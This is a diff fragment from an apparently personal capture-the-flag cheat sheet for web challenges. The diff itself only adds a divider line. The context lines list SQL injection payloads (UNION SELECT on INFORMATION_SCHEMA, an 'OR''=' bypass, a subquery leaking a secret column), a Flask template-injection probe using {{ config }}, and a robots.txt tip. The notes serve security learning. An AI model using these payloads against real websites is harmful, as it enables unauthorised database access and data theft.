@@ -36,6 +36,7 @@ this command will find the information to username admin stored in database (SQL
 * '||( SELECT secret FROM user WHERE username = 'a' )||'
 * 1 union select 1,TABLE_NAME, 3,4 from INFORMATION_SCHEMA.TABLES     input this code in the info bar of a website for sql attack using injection.
 * Basic Injection  if there is a hidden info in the data base then to leak the data type 'OR''=' in the info bar.
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
 *  Postman great tool for web challs
 * Robots -->>> url/robots.txt (shows hidden info)
 * If a website uses flask, then try using {{ 7*7 }}to see its working, then use {{ config }} in the text fields.
